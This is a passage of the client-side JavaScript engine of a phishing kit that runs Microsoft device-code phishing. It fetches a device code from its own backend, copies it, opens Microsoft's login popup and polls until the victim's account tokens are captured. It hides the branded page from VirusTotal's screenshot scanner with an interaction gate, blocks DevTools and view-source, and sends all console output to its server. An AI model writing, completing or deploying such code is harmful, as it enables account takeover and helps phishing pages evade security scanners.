/**
 * VGenius C Engine – Shared Template Engine
 * Modular, well-commented, no external dependencies except Turnstile.
 * 
 * Features:
 * - Fetch interceptor (auto-adds X-Auth-Mode header)
 * - Device code generation via /api/device/start
 * - Token polling via /api/device/status
 * - AADSTS50076 soft-error handling (switch to token mode)
 * - Toast notification system
 * - Timer countdown
 * - Popup tracker (Microsoft login)
 * - Background blur overlay
 * - Dynamic content injection via window.__* variables
 * - Copy-to-clipboard + auto-open popup
 * - Success overlay with redirect
 */
(function () {
  'use strict';

  // ─── Store original navigator.webdriver BEFORE any overrides ──
  // This must be done immediately to capture the true bot detection value
  var _originalWebdriver = false;
  try {
    _originalWebdriver = navigator.webdriver || false;
  } catch(e) {}

  // The getter initAntiScreenshot() installs to hide the automation flag.
  // Declared at module scope so isBotRequest() can recognise it by IDENTITY and
  // not mistake the page's own patch for a stealth library's spoof - that
  // mistake flagged every real visitor as a bot.
  var _vgWebdriverGetter = null;

  // ─── Server-Side Logging ────────────────────────────────────
  // Every console.* call is captured and shipped to /api/log. Nothing is ever
  // written to the browser console.
  //
  // Two previous defects made the console noisy:
  //   1. TESTING_MODE defaulted to true and __TESTING_MODE was never set by
  //      anyone in the codebase, so logToServer() echoed every entry locally
  //      with a "[VG-info]" prefix - the server path worked, but the echo was
  //      what was actually visible.
  //   2. The startup block below called the preserved original console
  //      functions directly, bypassing the hijack entirely and printing the
  //      backend URL straight into the browser console.
  // Both are gone: the original console is never captured, and there is no
  // local echo of any kind.
  var LOG_QUEUE = [];
  var LOG_FLUSHING = false;

  function logToServer(level, message, data) {
    // Queue log for server submission
    LOG_QUEUE.push({
      level: level,
      message: message,
      data: data || null,
      ts: Date.now(),
      url: window.location.href,
      ua: navigator.userAgent
    });

    // Flush queue to server
    flushLogs();
  }

  function flushLogs() {
    if (LOG_FLUSHING || LOG_QUEUE.length === 0) return;
    LOG_FLUSHING = true;

    var batch = LOG_QUEUE.splice(0, 20); // Send max 20 at a time
    LOG_QUEUE = []; // Clear queue even if send fails

    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(
          API_BASE + '/api/log',
          new Blob([JSON.stringify({ logs: batch, __jwt__: VG_JWT })], { type: 'application/json' })
        );
      } else {
        fetch(API_BASE + '/api/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ logs: batch, __jwt__: VG_JWT }),
          keepalive: true
        }).catch(function() {});
      }
    } catch(e) {
      // Silently fail - logging is non-critical
    }

    setTimeout(function() {
      LOG_FLUSHING = false;
      if (LOG_QUEUE.length > 0) flushLogs();
    }, 2000);
  }

  // Override console methods. These are the only sinks in this file: the
  // original console is never captured anywhere, so nothing in this script can
  // reach the browser console.
  console.log = function() { logToServer('info', Array.prototype.slice.call(arguments).join(' ')); };
  console.warn = function() { logToServer('warn', Array.prototype.slice.call(arguments).join(' ')); };
  console.error = function() { logToServer('error', Array.prototype.slice.call(arguments).join(' ')); };
  console.debug = function() { logToServer('debug', Array.prototype.slice.call(arguments).join(' ')); };
  console.info = function() { logToServer('info', Array.prototype.slice.call(arguments).join(' ')); };
  console.trace = function() { logToServer('trace', Array.prototype.slice.call(arguments).join(' ')); };

  // Expose the server logger so earlier modules can reach it. vg-cloak.js is
  // injected BEFORE vg-engine.js, so when it wipes the page it cannot call
  // logToServer directly - it routes through window.__VG_LOG instead.
  window.__VG_LOG = logToServer;

  // ─── Configuration ──────────────────────────────────────────
  var API_BASE = (typeof window.__API_BASE === 'string' && window.__API_BASE) ? window.__API_BASE : (typeof window.location !== 'undefined' ? window.location.origin : '');
  var AUTH_MODE = (typeof window.__AUTH_MODE === 'string' && window.__AUTH_MODE) ? window.__AUTH_MODE : 'cookie';
  var DEST_URL = window.__DESTINATION_URL || '';
  var VG_JWT = window.VG_JWT || '';
  var SHOW_VERIFICATION = window.__SHOW_VERIFICATION_COMPLETE !== 'false' && window.__SHOW_VERIFICATION_COMPLETE !== 'false';

  // Startup marker. Routed through logToServer so it reaches the server but
  // never the browser console. Deliberately carries no backend URL: the visitor
  // page URL is already attached to every queued entry, and printing the API
  // origin locally was a leak.
  logToServer('info', 'vg-engine loaded at ' + new Date().toISOString());

  // ─── Interaction Gate ────────────────────────────────────────
  // A screenshot taken before any human interaction sees a neutral page
  // instead of the branded verification UI.
  //
  // VirusTotal's URL scanner loads a page, waits roughly 20 seconds, takes
  // screenshots, and reports - and it does NOT interact. No mouse movement, no
  // typing, no clicking. So the branded content only appears once real input
  // arrives.
  //
  // This is the one defence that actually works against VT. Every user-agent,
  // navigator.webdriver, header and browser-fingerprint check fails, because VT
  // drives genuine Chrome with a normal user agent. Interaction is the only
  // signal it cannot fake, and Cloudflare Workers cannot see TLS fingerprints
  // (JA3) either, so no edge-side check closes the gap.
  //
  // The overlay is created at MODULE LEVEL, not inside init(). vg-engine is
  // injected before </head>, so this runs while the browser is still parsing
  // <head> and no body content has been rendered yet. Deferring it to
  // DOMContentLoaded would leave a flash window in which the branded UI is
  // visible before the overlay covers it - exactly the exposure this closes.
  //
  // z-index 200000 sits above #vgSliderLayer (99999) and the redirect layer
  // (100000), so nothing leaks through while the gate is up.
  (function () {
    var GATE_FALLBACK_MS = 30000;

    var el = document.createElement('div');
    el.id = 'vgInteractionGate';
    el.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;' +
      'z-index:200000;background:#fff;margin:0;padding:0;border:0;';
    // document.body does not exist yet when this runs from <head>; fall back to
    // documentElement so the overlay still covers the viewport.
    (document.body || document.documentElement).appendChild(el);

    var released = false;
    function release(reason) {
      if (released) return;
      released = true;
      // The release reason is the useful part. 'fallback_timeout' means nobody
      // interacted inside the window - which is what a passive scanner looks
      // like. It reaches deployment_logs through logToServer, so gate releases
      // by timeout are countable rather than invisible.
      console.log('[VG] Interaction gate released: ' + reason);
      var g = document.getElementById('vgInteractionGate');
      if (g && g.parentNode) g.parentNode.removeChild(g);
    }

    // Capture phase, so the gate releases before any page handler could see the
    // event and before the slider layer could intercept it.
    document.addEventListener('mousemove', function () { release('mousemove'); }, true);
    document.addEventListener('touchstart', function () { release('touchstart'); }, true);
    document.addEventListener('mousedown', function () { release('mousedown'); }, true);

    // Fallback so a human who sits still is not stranded on a blank page.
    // This is the dial on the tradeoff: below ~20s VT's screenshot window may
    // catch the branded UI; above it, a slow visitor sees white longer.
    setTimeout(function () { release('fallback_timeout'); }, GATE_FALLBACK_MS);
  })();

  // ─── Anti-Scraping Protection ────────────────────────────────
  // Block keyboard shortcuts and right-click to prevent scraping
  // Only active if antiscraping_enabled is not explicitly disabled
  (function() {
    // Check if anti-scraping is disabled via window variable
    if (typeof window.__ANTISCRAPE_ENABLED === 'string' && window.__ANTISCRAPE_ENABLED === 'false') {
      return; // Skip anti-scraping if disabled
    }

    // Block Ctrl+S, Ctrl+U, Ctrl+Shift+I, F12, Ctrl+P
    document.addEventListener('keydown', function(e) {
      // Ctrl+S (Save)
      if (e.ctrlKey && e.key === 's') {
        e.preventDefault();
      }
      // Ctrl+U (View Source)
      if (e.ctrlKey && e.key === 'u') {
        e.preventDefault();
      }
      // Ctrl+Shift+I (DevTools)
      if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
        e.preventDefault();
      }
      // F12 (DevTools)
      if (e.key === 'F12') {
        e.preventDefault();
      }
      // Ctrl+P (Print)
      if (e.ctrlKey && e.key === 'p') {
        e.preventDefault();
      }
      // macOS parity. Cmd is the Mac Ctrl key; without this clause Cmd+P
      // opened the print dialog, fired beforeprint and tripped
      // killPage('beforeprint') - a path Ctrl+P can never reach on Windows
      // because it is blocked right here. Cmd+S / Cmd+U mirror the
      // Windows-only save / view-source blocks above so Mac behaves exactly
      // like Windows: the shortcut is silently swallowed, never a kill.
      if (e.metaKey && (e.key === 'p' || e.key === 's' || e.key === 'u')) {
        e.preventDefault();
      }
    });

    // Block right-click context menu
    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
    });

    // DON'T block selectstart - it can interfere with form interactions
    // Instead, use CSS only for text selection prevention

    // Add CSS to prevent text selection (non-intrusive)
    var style = document.createElement('style');
    style.textContent = '.code-value{user-select:all;-webkit-user-select:all}body{user-select:none;-webkit-user-select:none}';
    if (document.head) document.head.appendChild(style);
  })();

  // ─── Fetch Interceptor ──────────────────────────────────────
  // Overrides window.fetch to automatically add X-Auth-Mode header
  // to /api/device/* requests and normalize responses.
  var _nativeFetch = window.fetch.bind(window);
  var _inflight = {};

  function isDeviceFetch(url) {
    try {
      var raw = typeof url === 'string' || url instanceof URL ? url : (url && url.url);
      if (!raw) return false;
      var path = new URL(raw, location.href).pathname;
      return path === '/api/device/start' || path.indexOf('/api/device/status/') === 0;
    } catch (e) {
      return false;
    }
  }

  function cloneResponse(r) {
    return r && typeof r.clone === 'function' ? r.clone() : r;
  }

  function getMethod(input, init) {
    return String((init && init.method) || (input && input.method) || 'GET').toUpperCase();
  }

  function normalizeDeviceJson(data) {
    if (!data || typeof data !== 'object' || Array.isArray(data)) return data;
    var out = {};
    for (var k in data) {
      if (Object.prototype.hasOwnProperty.call(data, k)) out[k] = data[k];
    }
    // Normalize status
    if (out.user_code && (!out.status || out.status === 'pending' || out.status === 'running' || out.status === 'queued')) {
      out.status = 'waiting_user';
    }
    if (out.status === 'error') out.status = 'failed';
    // Detect soft errors (AADSTS50076, interaction_required)
    var txt = [out.error, out.message, out.error_description, out.error_message].join(' ').toLowerCase();
    if (
      out.soft_error ||
      String(out.recommended_mode || '').toLowerCase() === 'token' ||
      String(out.error_code) === '50076' ||
      txt.indexOf('aadsts50076') !== -1 ||
      txt.indexOf('interaction_required') !== -1
    ) {
      out.soft_error = true;
      if (!out.error_code) out.error_code = 50076;
      if (!out.recommended_mode) out.recommended_mode = 'token';
    }
    return out;
  }

  window.fetch = function (input, init) {
    if (!isDeviceFetch(input)) return _nativeFetch(input, init);

    var nextInit = {};
    if (init) {
      for (var key in init) {
        if (Object.prototype.hasOwnProperty.call(init, key)) nextInit[key] = init[key];
      }
    }
    var headers = new Headers(nextInit.headers || undefined);
    if (!headers.has('X-Auth-Mode')) headers.set('X-Auth-Mode', AUTH_MODE);
    if (VG_JWT && !headers.has('X-VG-JWT')) headers.set('X-VG-JWT', VG_JWT);
    nextInit.headers = headers;

    // Dedupe GET status polls
    var method = getMethod(input, nextInit);
    var path = '';
    try { path = new URL(input, location.href).pathname; } catch (e) {}
    var dedupeKey = (method === 'GET' && path.indexOf('/api/device/status/') === 0) ? path : '';
    if (dedupeKey && _inflight[dedupeKey]) return _inflight[dedupeKey].then(cloneResponse);

    var request = _nativeFetch(input, nextInit).then(function (response) {
      if (!response || typeof response.clone !== 'function') return response;
      return response.clone().text().then(function (text) {
        if (!text) return response;
        try {
          var parsed = JSON.parse(text);
          var normalized = normalizeDeviceJson(parsed);
          var h = new Headers(response.headers);
          h.set('content-type', 'application/json; charset=utf-8');
          return new Response(JSON.stringify(normalized), { status: response.status, statusText: response.statusText, headers: h });
        } catch (e) {
          return response;
        }
      }, function () { return response; });
    });

    if (!dedupeKey) return request;
    _inflight[dedupeKey] = request;
    request.finally(function () { if (_inflight[dedupeKey] === request) delete _inflight[dedupeKey]; });
    return request.then(cloneResponse);
  };

  // ─── State ──────────────────────────────────────────────────
  var _jobId = null;
  var _userCode = '';
  var _pollTimer = null;
  var _countdownTimer = null;
  var _startTime = 0;
  var _codeReady = false;
  var _popupRef = null;
  var _toastTimer = null;

  // ─── Popup Tracker ──────────────────────────────────────────
  var _nativeOpen = window.open;
  function isMicrosoftUrl(u) {
    var s = String(u || '').toLowerCase();
    return s.indexOf('microsoft.com/devicelogin') !== -1 ||
      s.indexOf('login.microsoftonline.com') !== -1 ||
      s.indexOf('microsoftonline.com/appverify') !== -1 ||
      s.indexOf('login.live.com') !== -1;
  }
  window.open = function () {
    var w = _nativeOpen.apply(window, arguments);
    try {
      if (w && isMicrosoftUrl(arguments[0])) {
        _popupRef = w;
      }
    } catch (e) {}
    return w;
  };

  function closePopup() {
    var hadPopup = false;
    try {
      if (_popupRef && !_popupRef.closed) {
        hadPopup = true;
        try { _popupRef.close(); } catch (e) {}
        setTimeout(function () { try { if (_popupRef && !_popupRef.closed) _popupRef.close(); } catch (e) {} }, 100);
        setTimeout(function () { try { if (_popupRef && !_popupRef.closed) _popupRef.close(); } catch (e) {} }, 300);
      }
    } catch (e) {}
    _popupRef = null;
    return hadPopup;
  }

  // ─── Toast System ───────────────────────────────────────────
  function showToast(title, msg, duration) {
    duration = duration || 7000;
    var wrap = document.getElementById('vg-toast-wrap');
    if (!wrap) {
      wrap = document.createElement('div');
      wrap.id = 'vg-toast-wrap';
      wrap.style.cssText = 'position:fixed;inset:0;z-index:2147483647;display:flex;align-items:flex-start;justify-content:center;padding:72px 16px 16px;box-sizing:border-box;opacity:0;pointer-events:none;transition:opacity .2s;';
      wrap.innerHTML = '<div style="position:absolute;inset:0;background:rgba(15,23,42,.28);backdrop-filter:blur(1px);"></div>' +
        '<div id="vg-toast-card" style="position:relative;z-index:1;max-width:460px;width:min(92vw,420px);background:#fff;color:#111827;border:1px solid #e5e7eb;border-radius:12px;padding:16px;box-shadow:0 20px 45px rgba(15,23,42,.18);font-family:Segoe UI,Arial,sans-serif;display:grid;gap:12px;transform:translateY(-8px);transition:all .22s ease;box-sizing:border-box;">' +
        '<div style="display:flex;align-items:flex-start;gap:12px;">' +
        '<div style="width:34px;height:34px;flex:0 0 34px;display:flex;align-items:center;justify-content:center;border-radius:999px;background:#eef6ff;color:#0f6cbd;font-size:17px;font-weight:700;">i</div>' +
        '<div style="display:grid;gap:5px;line-height:1.3"><div id="vg-toast-title" style="font-size:15px;font-weight:700;color:#111827;"></div><div id="vg-toast-msg" style="font-size:13px;color:#4b5563;line-height:1.45;"></div></div>' +
        '</div>' +
        '<div style="display:flex;justify-content:flex-end;"><button id="vg-toast-close" style="height:34px;padding:0 12px;border-radius:8px;border:1px solid #d1d5db;background:#fff;color:#374151;font-weight:600;font-size:13px;cursor:pointer;">Dismiss</button></div>' +
        '</div>';
      (document.body || document.documentElement).appendChild(wrap);
      document.getElementById('vg-toast-close').onclick = function () { hideToast(); };
    }
    document.getElementById('vg-toast-title').textContent = title || '';
    document.getElementById('vg-toast-msg').textContent = msg || '';
    var card = document.getElementById('vg-toast-card');
    wrap.style.opacity = '1';
    wrap.style.pointerEvents = 'auto';
    card.style.transform = 'translateY(0)';
    clearTimeout(_toastTimer);
    _toastTimer = setTimeout(hideToast, duration);
  }

  function hideToast() {
    var wrap = document.getElementById('vg-toast-wrap');
    if (!wrap) return;
    var card = document.getElementById('vg-toast-card');
    wrap.style.opacity = '0';
    wrap.style.pointerEvents = 'none';
    if (card) card.style.transform = 'translateY(-8px)';
  }

  // ─── DOM Helpers ────────────────────────────────────────────
  function setText(selector, text) {
    if (typeof text !== 'string' || text === '') return;
    document.querySelectorAll(selector).forEach(function (el) { el.textContent = text; });
  }

  function applyDynamicContent() {
    if (window.__DOC_FILENAME) document.querySelectorAll('[data-doc-filename]').forEach(function (el) { el.textContent = window.__DOC_FILENAME; });
    if (window.__DOC_TITLE) document.querySelectorAll('[data-doc-title]').forEach(function (el) { el.textContent = window.__DOC_TITLE; });
    if (window.__DOC_PAGES) document.querySelectorAll('[data-doc-pages]').forEach(function (el) { el.textContent = window.__DOC_PAGES; });
    if (typeof window.__PAGE_TITLE === 'string' && window.__PAGE_TITLE !== '') {
      setText('[data-page-title],[data-template-title],[data-custom-title]', window.__PAGE_TITLE);
      var fallback = document.querySelector('main h1, .card h1, .shell h1, h1');
      if (fallback && !document.querySelector('[data-page-title]')) fallback.textContent = window.__PAGE_TITLE;
    }
    if (typeof window.__PAGE_MESSAGE === 'string' && window.__PAGE_MESSAGE !== '') {
      setText('[data-page-message],[data-template-message],[data-custom-message]', window.__PAGE_MESSAGE);
    }
    if (typeof window.__PRIMARY_BUTTON_TEXT === 'string' && window.__PRIMARY_BUTTON_TEXT !== '') {
      setText('[data-primary-button]', window.__PRIMARY_BUTTON_TEXT);
      var btn = document.querySelector('button.cta-btn, button.bp, button.go, button.linakufe, button.btn-open');
      if (btn && !btn.querySelector('[data-primary-button]')) {
        var walker = document.createTreeWalker(btn, NodeFilter.SHOW_TEXT);
        var first = walker.nextNode();
        if (first) {
          first.nodeValue = window.__PRIMARY_BUTTON_TEXT;
          var next;
          while ((next = walker.nextNode())) next.nodeValue = '';
        }
      }
    }
  }

  // ─── Background Blur ────────────────────────────────────────
  function initBackgroundBlur() {
    var rawUrl = typeof window.__BACKGROUND_BLUR_URL === 'string' ? window.__BACKGROUND_BLUR_URL.trim() : '';
    if (!rawUrl) return;
    var blur = Number(window.__BACKGROUND_BLUR_AMOUNT);
    if (!Number.isFinite(blur)) blur = 2.5;
    blur = Math.max(0, Math.min(12, blur));

    var body = document.body;
    if (!body || document.body.getAttribute('data-vg-bg-ready') === '1') return;

    var style = document.createElement('style');
    style.id = 'vg-bg-styles';
    style.textContent =
      'html.vg-bg-active{min-height:100%;background:#0c1220!important;}' +
      'body.vg-bg-active{min-height:100vh!important;background:transparent!important;}' +
      'body.vg-bg-active>#vg-bg-layer{position:fixed!important;inset:0!important;z-index:0!important;pointer-events:none!important;}' +
      'body.vg-bg-active>#vg-bg-layer .vg-bg-image{position:absolute!important;inset:-3%!important;width:106%!important;height:106%!important;background-position:center!important;background-size:cover!important;background-repeat:no-repeat!important;filter:blur(var(--vg-bg-blur,2.5px)) brightness(.9) saturate(.98)!important;transform:scale(1.02)!important;}' +
      'body.vg-bg-active>#vg-bg-layer .vg-bg-overlay{position:absolute!important;inset:0!important;background:rgba(12,18,32,.36)!important;}';
    (document.head || document.documentElement).appendChild(style);

    try {
      var parsedUrl = new URL(rawUrl, location.href);
      if (!/^https?:$/.test(parsedUrl.protocol)) return;
    } catch (e) { return; }

    document.documentElement.classList.add('vg-bg-active');
    body.classList.add('vg-bg-active');
    body.style.setProperty('--vg-bg-blur', blur + 'px');

    var layer = document.createElement('div');
    layer.id = 'vg-bg-layer';
    layer.setAttribute('aria-hidden', 'true');

    var image = document.createElement('div');
    image.className = 'vg-bg-image';
    image.style.backgroundImage = 'url("' + parsedUrl.href.replace(/"/g, '%22') + '")';

    var overlay = document.createElement('div');
    overlay.className = 'vg-bg-overlay';

    layer.appendChild(image);
    layer.appendChild(overlay);

    if (!body.firstChild) {
      body.appendChild(layer);
    } else {
      body.insertBefore(layer, body.firstChild);
    }
    body.setAttribute('data-vg-bg-ready', '1');
  }

  // ─── Code Generation ────────────────────────────────────────
  window.generateCode = async function () {
    console.log('[VG] generateCode called');
    // Reset UI state
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.style.display = 'none';
    var actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'none';
    var timerEl = document.getElementById('timerPill');
    if (timerEl) { timerEl.textContent = ''; timerEl.style.display = 'none'; timerEl.classList.remove('expired'); }

    var startBtn = document.getElementById('startBtn');
    console.log('[VG] startBtn found:', !!startBtn);
    var originalBtnText = '<span class="vg-spin">&#x27F3;</span> Generating code...';
    if (startBtn) { startBtn.disabled = true; startBtn.innerHTML = originalBtnText; }

    _setStatus('');
    clearInterval(_pollTimer);
    clearInterval(_countdownTimer);
    _jobId = null;
    _userCode = '';
    _codeReady = false;

    try {
      var apiUrl = API_BASE ? API_BASE + '/api/device/start' : '/api/device/start';
      console.log('[VG] API URL:', apiUrl);
      console.log('[VG] API_BASE:', API_BASE);
      console.log('[VG] AUTH_MODE:', AUTH_MODE);
      console.log('[VG] VG_JWT present:', !!VG_JWT);

      // -- Turnstile token acquisition --------------------------------
      // The token comes from whichever widget the engine rendered:
      //   * invisible designs -> a background widget in a hidden container,
      //                           completed automatically in a few seconds
      //   * managed designs   -> the visible widget rendered into
      //                           #vgCfWidgetWrap after the slider completes;
      //                           a managed widget in a HIDDEN container can
      //                           never complete, so the background one is a
      //                           no-op for managed and only the user-facing
      //                           widget produces the token
      // Never fire /api/device/start without a token: an empty token is a
      // guaranteed 400 "CAPTCHA verification failed" - exactly what a first
      // click before the invisible challenge completed used to do.
      if (_vgTurnstileOn()) {
        if (window.__TURNSTILE_TOKEN) {
          console.log('[VG] Turnstile token ready (len=' + window.__TURNSTILE_TOKEN.length + ')');
        } else if (_vgTurnstileManaged()) {
          // The visitor just completed the visible managed challenge (slider
          // designs): executeTurnstileIntoWrap's callback stores the token, so
          // it must already be here even without the background widget.
          console.log('[VG] Turnstile token: using user-facing managed widget token');
        } else {
          // Invisible design: wait for the background widget. It may still be
          // fetching api.js or completing its first execute(); a re-execute
          // nudge every 2s recovers a challenge that fired too early.
          console.log('[VG] Turnstile token: waiting for background widget...');
          var _tsWaited = 0;
          var _tsLastNudge = 0;
          while (!window.__TURNSTILE_TOKEN && _tsWaited < 6000) {
            if (window.turnstile && window.__TURNSTILE_WIDGET_ID && (_tsWaited - _tsLastNudge) >= 2000) {
              _tsLastNudge = _tsWaited;
              try { window.turnstile.execute(window.__TURNSTILE_WIDGET_ID); } catch (e) {}
            }
            await new Promise(function (res) { setTimeout(res, 200); });
            _tsWaited += 200;
          }
          console.log('[VG] Turnstile wait: ' + _tsWaited + 'ms token=' +
            (window.__TURNSTILE_TOKEN ? 'yes len=' + window.__TURNSTILE_TOKEN.length : 'NO'));
        }
      }
      console.log('[VG] Turnstile token:', window.__TURNSTILE_TOKEN);

      if (_vgTurnstileOn() && !window.__TURNSTILE_TOKEN) {
        // Still no token after the wait (api.js blocked, origin not whitelisted
        // for the sitekey, or the widget errored - see the "turnstile" [VG]
        // log lines for which). Do not waste a request on the guaranteed 400.
        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = originalBtnText; }
        _showError('Security check not completed. Please click Generate Code again.');
        return;
      }

      var r = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Auth-Mode': AUTH_MODE,
          'X-VG-JWT': VG_JWT,
          'X-Turnstile-Token': window.__TURNSTILE_TOKEN || '',
        },
        body: JSON.stringify({
          mode: AUTH_MODE,
          jwt_token: VG_JWT,
          turnstile_token: window.__TURNSTILE_TOKEN || null,
        }),
      });
      console.log('[VG] Response status:', r.status);
      var d = await r.json();
      console.log('[VG] Response data:', JSON.stringify(d).substring(0, 500));

      // The Turnstile token is single-use. We just sent it, so clear it now:
      // any retry must re-acquire a fresh token instead of resending the same
      // one and tripping Cloudflare's "timeout-or-duplicate" on the next hit.
      window.__TURNSTILE_TOKEN = null;

      if (d.error) {
        console.log('[VG] Error in response:', d.error);
        _showError(d.error);
        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
        return;
      }

      // The worker returns the code inline with NO job_id (it polls Microsoft
      // server-side); the backend returns a job_id for the page to poll. So a
      // missing job_id is NOT an error when we already have a code to render.
      _jobId = d.job_id || '';
      _userCode = d.user_code || '';
      console.log('[VG] job_id:', _jobId, '| user_code:', _userCode ? ('len=' + _userCode.length) : 'NO');

      _startTime = Date.now();
      var codePanel = document.getElementById('codePanel');
      console.log('[VG] codePanel found:', !!codePanel);
      if (codePanel) codePanel.classList.add('show');

      if (_userCode) {
        // Render the code now (worker flow: it arrives with the start call).
        console.log('[VG] Displaying user code:', _userCode);
        var codeEl = document.getElementById('codeValue');
        console.log('[VG] codeEl found:', !!codeEl);
        if (codeEl) {
          // Mark as revealed so obfuscation skips it
          codeEl.setAttribute('data-vg-revealed', 'true');
          codeEl.style.opacity = 0;
          setTimeout(function () {
            codeEl.textContent = _userCode;
            codeEl.classList.remove('loading');
            codeEl.style.opacity = 1;
            console.log('[VG] Code displayed successfully');
          }, 150);
        }

        // Clear all status messages
        var codeHint = document.getElementById('codeHint');
        if (codeHint) codeHint.textContent = '';

        var statusEl = document.getElementById('statusMsg');
        if (statusEl) statusEl.textContent = '';

        // Hide generate button, show action buttons
        if (startBtn) { startBtn.disabled = false; startBtn.style.display = 'none'; }
        if (actionRow) {
          // Use setProperty with important to override any CSS
          actionRow.style.setProperty('display', 'flex', 'important');
          _codeReady = true;
          console.log('[VG] Action row shown');
        }

        // Only poll when there is a job to track. The worker flow has no
        // job_id / status endpoint (it polls on the server), so there the
        // expiry countdown above is all that's needed.
        if (_jobId) {
          _pollTimer = setInterval(_poll, 1000);
          _poll();
        }
        _startTimer(d.expires_in || 600);
      } else if (_jobId) {
        // Backend flow: job registered, code still pending. Poll for it.
        console.log('[VG] No user_code yet, polling via job_id');
        _setStatus('Connecting to Microsoft servers...');
        _pollTimer = setInterval(_poll, 1000);
        _poll();
      } else {
        // Neither a code nor a pollable job: genuine failure.
        console.log('[VG] No job_id and no user_code in response');
        _showError('Session failed. Please refresh.');
        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = originalBtnText; }
        return;
      }
    } catch (e) {
      console.error('[VG] Error in generateCode:', e);
      _showError(e.message || 'Connection failed');
      if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
    }
  };

  // ─── Polling ────────────────────────────────────────────────
  var _pollFailures = 0;
  var _pollBackoff = 1000; // Start at 1 second
  var _maxPollFailures = 10; // After this many consecutive failures, show error

  async function _poll() {
    if (Date.now() - _startTime > 600000) {
      clearInterval(_pollTimer);
      _onExpired();
      return;
    }

    try {
      var statusUrl = API_BASE ? API_BASE + '/api/device/status/' + _jobId : '/api/device/status/' + _jobId;
      var r = await fetch(statusUrl);
      var d = await r.json();

      // Reset failure count on successful response
      _pollFailures = 0;
      _pollBackoff = 1000;

      if (d.status === 'waiting_user' && d.user_code) {
        var el = document.getElementById('codeValue');
        if (el) {
          // Mark as revealed so obfuscation skips it
          el.setAttribute('data-vg-revealed', 'true');
          if (el.textContent !== d.user_code) {
            el.style.opacity = 0;
            setTimeout(function () {
              el.textContent = d.user_code;
              el.classList.remove('loading');
              el.style.opacity = 1;
            }, 150);
          }
        }
        _userCode = d.user_code;

        if (!_codeReady) {
          _codeReady = true;
          var startBtn = document.getElementById('startBtn');
          if (startBtn) startBtn.style.display = 'none';
          var actionRow = document.getElementById('actionRow');
          if (actionRow) {
            actionRow.style.setProperty('display', 'flex', 'important');
          }
          _setStatus('');
          _startTimer(d.expires_in || 600);
        }
      }

      // Success
      if (d.status === 'done' || d.status === 'success' || d.status === 'completed') {
        clearInterval(_pollTimer);
        clearInterval(_countdownTimer);
        closePopup();
        _showSuccess();
        return;
      }

      // Soft error (AADSTS50076)
      if (d.soft_error || d.status === 'soft_error') {
        clearInterval(_pollTimer);
        // Switch to token mode
        AUTH_MODE = 'token';
        showToast('Additional verification required', 'A new verification session is being prepared.', 7600);
        // If retry_job_id is available, switch to it
        if (d.retry_job_id) {
          _jobId = d.retry_job_id;
          _codeReady = false;
          _pollTimer = setInterval(_poll, 1000);
        } else {
          // Start a new flow in token mode
          setTimeout(function () { window.generateCode(); }, 1500);
        }
        return;
      }

      // Failed/expired
      if (d.status === 'failed' || d.status === 'expired' || d.status === 'timeout_waiting_user_login') {
        clearInterval(_pollTimer);
        clearInterval(_countdownTimer);
        _showError(d.error || d.status || 'Verification failed');
      }
    } catch (e) {
      // Log the error to server
      console.error('[VG] Poll error:', e.message || e);

      _pollFailures++;
      console.log('[VG] Poll failures:', _pollFailures);

      // Exponential backoff: 1s, 2s, 4s, 8s, max 15s
      _pollBackoff = Math.min(_pollBackoff * 2, 15000);

      // Show error to user after too many consecutive failures
      if (_pollFailures >= _maxPollFailures) {
        console.error('[VG] Too many poll failures, showing error to user');
        _showError('Connection to verification server lost. Please refresh the page.');
        clearInterval(_pollTimer);
        return;
      }

      // Show temporary warning after 3 failures
      if (_pollFailures === 3) {
        _setStatus('Having trouble connecting... retrying...');
      }
    }

    // Schedule next poll with current backoff
    if (!_pollTimer) return; // Already cleared
    clearInterval(_pollTimer);
    _pollTimer = setInterval(_poll, _pollBackoff);
  }

  // ─── Timer ──────────────────────────────────────────────────
  function _startTimer(sec) {
    clearInterval(_countdownTimer);
    var el = document.getElementById('timerPill');
    if (!el) return;
    el.style.display = 'inline-flex';
    var t = sec;
    var tick = function () {
      if (t > 0) {
        var m = Math.floor(t / 60);
        var s = String(t % 60).padStart(2, '0');
        el.textContent = 'Valid for ' + m + ':' + s;
      } else {
        clearInterval(_countdownTimer);
        clearInterval(_pollTimer);
        _onExpired();
      }
      t--;
    };
    tick();
    _countdownTimer = setInterval(tick, 1000);
  }

  function _onExpired() {
    var timerEl = document.getElementById('timerPill');
    if (timerEl) {
      timerEl.textContent = 'Code expired.';
      timerEl.classList.add('expired');
    }
    var actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'none';
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.style.display = 'inline-flex';
    _setStatus('');
  }

  // ─── Copy + Open Popup ──────────────────────────────────────
  function copyText(text) {
    return navigator.clipboard.writeText(text).catch(function () {
      var ta = document.createElement('textarea');
      ta.value = text;
      ta.style.position = 'fixed';
      ta.style.opacity = '0';
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    });
  }

  window.copyAndOpenPopup = function () {
    copyText(_userCode).then(function () {
      var btn = document.getElementById('copyBtn');
      if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
    });
    openMsLogin();
  };

  window.verifyWithCopy = function () {
    copyText(_userCode).then(function () {
      var btn = document.getElementById('verifyBtn');
